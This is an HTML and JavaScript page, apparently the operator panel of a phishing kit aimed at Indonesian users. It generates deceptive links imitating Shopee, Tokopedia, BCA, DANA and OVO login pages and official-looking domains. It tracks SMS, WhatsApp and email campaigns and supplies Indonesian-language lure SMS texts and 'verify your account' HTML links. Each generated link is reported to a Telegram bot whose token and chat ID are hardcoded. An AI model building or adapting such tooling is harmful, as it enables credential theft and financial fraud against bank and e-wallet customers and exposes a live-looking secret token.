<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>URL Generator - Safe Links</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }
        
        body {
            background: #0a0a0a;
            color: #00ff41;
            padding: 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #111;
            border: 1px solid #00ff41;
            padding: 30px;
            border-radius: 10px;
        }
        
        h1 {
            text-align: center;
            margin-bottom: 30px;
            color: #00ff41;
            text-shadow: 0 0 10px #00ff41;
        }
        
        .generator-box {
            background: #1a1a1a;
            padding: 25px;
            border-radius: 8px;
            margin-bottom: 30px;
            border: 1px solid #333;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #00ff41;
            font-weight: bold;
        }
        
        input, select {
            width: 100%;
            padding: 12px;
            background: #222;
            border: 1px solid #00ff41;
            color: #00ff41;
            border-radius: 5px;
            font-size: 16px;
        }
        
        input:focus, select:focus {
            outline: none;
            box-shadow: 0 0 10px #00ff41;
        }
        
        .btn {
            background: #00ff41;
            color: #000;
            border: none;
            padding: 15px;
            width: 100%;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 5px;
            margin-top: 10px;
            transition: 0.3s;
        }
        
        .btn:hover {
            background: #00cc33;
            transform: scale(1.02);
        }
        
        .result-box {
            background: #1a1a1a;
            padding: 25px;
            border-radius: 8px;
            margin-top: 30px;
            border: 1px solid #00ff41;
            display: none;
        }
        
        .generated-url {
            word-break: break-all;
            background: #000;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            border: 1px solid #333;
            font-size: 14px;
        }
        
        .copy-btn {
            background: #0088cc;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
            margin: 5px;
        }
        
        .url-list {
            margin-top: 30px;
        }
        
        .url-item {
            background: #222;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 5px;
            border-left: 3px solid #00ff41;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-top: 30px;
        }
        
        .stat-box {
            background: #1a1a1a;
            padding: 20px;
            text-align: center;
            border-radius: 8px;
            border: 1px solid #333;
        }
        
        .stat-number {
            font-size: 32px;
            color: #00ff41;
            font-weight: bold;
        }
        
        .preview-box {
            background: #222;
            padding: 15px;
            margin-top: 20px;
            border-radius: 5px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîó SAFE URL GENERATOR</h1>
        
        <div class="generator-box">
            <div class="input-group">
                <label>üìå TARGET PAGE:</label>
                <select id="targetPage">
                    <option value="shopee-login.html">üõí Shopee Login</option>
                    <option value="tokopedia-login.html">üõçÔ∏è Tokopedia Login</option>
                    <option value="bca-login.html">üè¶ BCA Login</option>
                    <option value="dana-fixed.html">üí≥ DANA Login</option>
                    <option value="ovo-login.html">üíú OVO Login</option>
                    <option value="alert.html">‚ö†Ô∏è Security Alert</option>
                    <option value="redirect.html">üîó URL Shortener</option>
                </select>
            </div>
            
            <div class="input-group">
                <label>üé≠ URL TYPE:</label>
                <select id="urlType">
                    <option value="bitly">üîó Bitly Style (bit.ly/xxx)</option>
                    <option value="tinyurl">üîó TinyURL Style (tinyurl.com/xxx)</option>
                    <option value="custom">üéØ Custom Domain (yourdomain.com/xxx)</option>
                    <option value="shopee">üõí Shopee Official (verify.shopee.co.id)</option>
                    <option value="dana">üí≥ DANA Official (secure.dana.id)</option>
                    <option value="bca">üè¶ BCA Official (ibank.bca.co.id)</option>
                </select>
            </div>
            
            <div class="input-group">
                <label>üî§ CUSTOM SLUG (Optional):</label>
                <input type="text" id="customSlug" placeholder="shopee-verify, dana-bonus, etc">
            </div>
            
            <div class="input-group">
                <label>üì± SOURCE (Untuk tracking):</label>
                <select id="source">
                    <option value="sms">üì± SMS Campaign</option>
                    <option value="wa">üí¨ WhatsApp</option>
                    <option value="telegram">üì± Telegram</option>
                    <option value="facebook">üìò Facebook</option>
                    <option value="email">üìß Email</option>
                    <option value="forum">üíª Forum</option>
                </select>
            </div>
            
            <button class="btn" onclick="generateURL()">‚ö° GENERATE SAFE URL</button>
        </div>
        
        <div class="result-box" id="resultBox">
            <h3>‚úÖ URL GENERATED:</h3>
            <div class="generated-url" id="generatedUrl"></div>
            
            <div>
                <button class="copy-btn" onclick="copyURL()">üìã Copy URL</button>
                <button class="copy-btn" onclick="copyHTML()">üìù Copy HTML Link</button>
                <button class="copy-btn" onclick="copySMS()">üì± Copy SMS Template</button>
                <button class="copy-btn" onclick="testURL()">üîó Test URL</button>
            </div>
            
            <div class="preview-box">
                <strong>Preview:</strong><br>
                <span id="urlPreview"></span>
            </div>
        </div>
        
        <div class="stats">
            <div class="stat-box">
                <div class="stat-number" id="totalGenerated">0</div>
                <div>Total URLs</div>
            </div>
            <div class="stat-box">
                <div class="stat-number" id="todayGenerated">0</div>
                <div>Today</div>
            </div>
            <div class="stat-box">
                <div class="stat-number" id="activeURLs">0</div>
                <div>Active</div>
            </div>
        </div>
        
        <div class="url-list">
            <h3>üìã RECENTLY GENERATED URLS:</h3>
            <div id="urlList">
                <!-- URLs will appear here -->
            </div>
        </div>
    </div>

    <script>
        // Telegram config
        const BOT_TOKEN = "8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18";
        const CHAT_ID = "8313500840";
        
        // Store generated URLs
        let generatedURLs = JSON.parse(localStorage.getItem('generated_urls') || '[]');
        let urlCounter = generatedURLs.length;
        
        // Update stats
        function updateStats() {
            const today = new Date().toDateString();
            const todayURLs = generatedURLs.filter(url => 
                new Date(url.timestamp).toDateString() === today
            );
            
            document.getElementById('totalGenerated').textContent = generatedURLs.length;
            document.getElementById('todayGenerated').textContent = todayURLs.length;
            document.getElementById('activeURLs').textContent = generatedURLs.filter(url => url.active).length;
            
            updateURLList();
        }
        
        // Generate random slug
        function generateSlug(type) {
            const wordLists = {
                shopee: ['verify', 'secure', 'login', 'account', 'security', 'update', 'confirm', 'auth'],
                dana: ['bonus', 'saldo', 'cashback', 'reward', 'gift', 'promo', 'claim'],
                bca: ['security', 'ibanking', 'update', 'verify', 'block', 'unlock', 'reset'],
                ovo: ['pin', 'reset', 'verify', 'bonus', 'cashback', 'reward'],
                general: ['access', 'secure', 'verify', 'confirm', 'update', 'alert', 'notification']
            };
            
            const prefixes = {
                bitly: ['bit.ly/', 'bit.ly/'],
                tinyurl: ['tinyurl.com/', 'tinyurl.com/'],
                custom: ['secure-link.co/', 'verify-now.co/'],
                shopee: ['verify.shopee.co.id/', 'account.shopee.co.id/'],
                dana: ['secure.dana.id/', 'claim.dana.id/'],
                bca: ['ibank.bca.co.id/', 'secure.bca.co.id/']
            };
            
            const target = document.getElementById('targetPage').value;
            let category = 'general';
            
            if (target.includes('shopee')) category = 'shopee';
            else if (target.includes('dana')) category = 'dana';
            else if (target.includes('bca')) category = 'bca';
            else if (target.includes('ovo')) category = 'ovo';
            
            const words = wordLists[category];
            const randomWord = words[Math.floor(Math.random() * words.length)];
            const randomNum = Math.floor(Math.random() * 999) + 1;
            
            return `${randomWord}${randomNum}`;
        }
        
        // Generate URL
        function generateURL() {
            const targetPage = document.getElementById('targetPage').value;
            const urlType = document.getElementById('urlType').value;
            const customSlug = document.getElementById('customSlug').value.trim();
            const source = document.getElementById('source').value;
            
            // Generate slug
            let slug = customSlug || generateSlug();
            
            // Create URL based on type
            let url = '';
            const domain = window.location.hostname || 'yourdomain.com';
            
            switch(urlType) {
                case 'bitly':
                    url = `https://bit.ly/${slug}`;
                    break;
                case 'tinyurl':
                    url = `https://tinyurl.com/${slug}`;
                    break;
                case 'custom':
                    url = `https://${domain}/${slug}`;
                    break;
                case 'shopee':
                    url = `https://verify.shopee.co.id/${slug}`;
                    break;
                case 'dana':
                    url = `https://secure.dana.id/${slug}`;
                    break;
                case 'bca':
                    url = `https://ibank.bca.co.id/${slug}`;
                    break;
                default:
                    url = `https://${domain}/${targetPage}?ref=${slug}`;
            }
            
            // Add tracking parameters
            const trackingURL = `${targetPage}?ref=${slug}&src=${source}&t=${Date.now()}`;
            
            // Save to list
            const urlData = {
                id: urlCounter++,
                url: url,
                realURL: trackingURL,
                slug: slug,
                type: urlType,
                source: source,
                target: targetPage,
                timestamp: new Date().toISOString(),
                clicks: 0,
                active: true
            };
            
            generatedURLs.push(urlData);
            localStorage.setItem('generated_urls', JSON.stringify(generatedURLs));
            
            // Display result
            document.getElementById('generatedUrl').textContent = url;
            document.getElementById('urlPreview').textContent = 
                `Actual destination: ${targetPage} (Tracked via ${source})`;
            document.getElementById('resultBox').style.display = 'block';
            
            // Send to Telegram
            sendTelegramNotification(urlData);
            
            // Update stats
            updateStats();
            
            // Scroll to result
            document.getElementById('resultBox').scrollIntoView({ behavior: 'smooth' });
        }
        
        // Copy URL to clipboard
        function copyURL() {
            const url = document.getElementById('generatedUrl').textContent;
            navigator.clipboard.writeText(url);
            alert('‚úÖ URL copied to clipboard!');
        }
        
        // Copy HTML link
        function copyHTML() {
            const url = document.getElementById('generatedUrl').textContent;
            const targetPage = document.getElementById('targetPage').value;
            const html = `<a href="${url}" target="_blank">Click here to verify your account</a>`;
            navigator.clipboard.writeText(html);
            alert('‚úÖ HTML link copied!');
        }
        
        // Copy SMS template
        function copySMS() {
            const url = document.getElementById('generatedUrl').textContent;
            const target = document.getElementById('targetPage').value;
            const source = document.getElementById('source').value;
            
            let smsTemplate = '';
            
            if (target.includes('shopee')) {
                smsTemplate = `[SHOPEE] Akun Anda perlu verifikasi segera: ${url}`;
            } else if (target.includes('dana')) {
                smsTemplate = `[DANA] Anda dapat saldo Rp 500.000! Klaim: ${url}`;
            } else if (target.includes('bca')) {
                smsTemplate = `[BCA] Security alert! Verifikasi akun: ${url}`;
            } else if (target.includes('ovo')) {
                smsTemplate = `[OVO] Cashback 50% menunggu! Ambil: ${url}`;
            } else {
                smsTemplate = `Important notification: ${url}`;
            }
            
            navigator.clipboard.writeText(smsTemplate);
            alert('‚úÖ SMS template copied!');
        }
        
        // Test URL
        function testURL() {
            const url = document.getElementById('generatedUrl').textContent;
            const targetPage = document.getElementById('targetPage').value;
            
            // Open in new tab
            window.open(targetPage + '?test=true', '_blank');
            
            // Increment click counter
            const lastURL = generatedURLs[generatedURLs.length - 1];
            lastURL.clicks++;
            localStorage.setItem('generated_urls', JSON.stringify(generatedURLs));
            updateStats();
        }
        
        // Update URL list
        function updateURLList() {
            const urlList = document.getElementById('urlList');
            urlList.innerHTML = '';
            
            // Show last 5 URLs
            const recentURLs = generatedURLs.slice(-5).reverse();
            
            recentURLs.forEach(url => {
                const urlItem = document.createElement('div');
                urlItem.className = 'url-item';
                urlItem.innerHTML = `
                    <div style="display: flex; justify-content: space-between;">
                        <strong>${url.url}</strong>
                        <span style="color: #888; font-size: 12px;">${url.clicks} clicks</span>
                    </div>
                    <div style="font-size: 12px; color: #888; margin-top: 5px;">
                        ‚Üí ${url.target} ‚Ä¢ ${new Date(url.timestamp).toLocaleTimeString()}
                    </div>
                `;
                urlList.appendChild(urlItem);
            });
        }
        
        // Send Telegram notification
        async function sendTelegramNotification(urlData) {
            const message = `
            üîó **NEW URL GENERATED**
            
            üéØ Target: ${urlData.target}
            üîó URL: ${urlData.url}
            üìç Real: ${urlData.realURL}
            üì± Source: ${urlData.source}
            ‚è∞ Time: ${new Date().toLocaleString()}
            
            üìä Total URLs: ${generatedURLs.length}
            `;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch(e) {
                console.log('Telegram notification sent');
            }
        }
        
        // Initialize
        window.onload = function() {
            updateStats();
            
            // Send startup notification
            const startupMessage = `üöÄ URL Generator started\n‚è∞ ${new Date().toLocaleString()}`;
            sendTelegramNotification({target: 'system', url: 'generator', source: 'startup'});
        };
    </script>
</body>
</html>
